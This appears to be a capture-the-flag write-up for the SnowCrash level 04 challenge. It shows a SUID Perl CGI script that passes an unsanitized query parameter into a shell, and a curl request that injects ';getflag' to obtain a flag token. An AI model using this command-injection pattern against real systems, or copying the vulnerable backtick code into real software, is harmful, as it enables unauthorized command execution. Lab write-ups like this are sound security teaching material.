# LEVEL 04

## Summary

Same as level03, level04.pl script is owned by user flag04 with the SUID bit.
It's a Perl script that expose the machin on localhost:4747 and use a query parameter (x)
non-sanitized in a part executed in a shell. We can therefore do a command injection and execute 'getflag' by setting x at `;getflag`.

## Workflow

1. Check current directory, it contains level04.pl owned by flag04 and with the SUID bit set.
	```
	level04@SnowCrash:~$ ls -l 
	total 4
	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
	```

2. Check the content of level04.pl, it is a Perl script that expose a web server on localhost:4747.
	```
	level04@SnowCrash:~$ cat level04.pl 
	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
	  $y = $_[0];
	  print `echo $y 2>&1`;
	}
	x(param("x"));
	```

3. Since the parameter x is used directly (not sanitized), injection getflag execution by setting x to `;getflag` (';' = "%3B" in URL encoding).
	```
	level04@SnowCrash:~$ curl 'http://localhost:4747/?x=%3Bgetflag'

	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
	```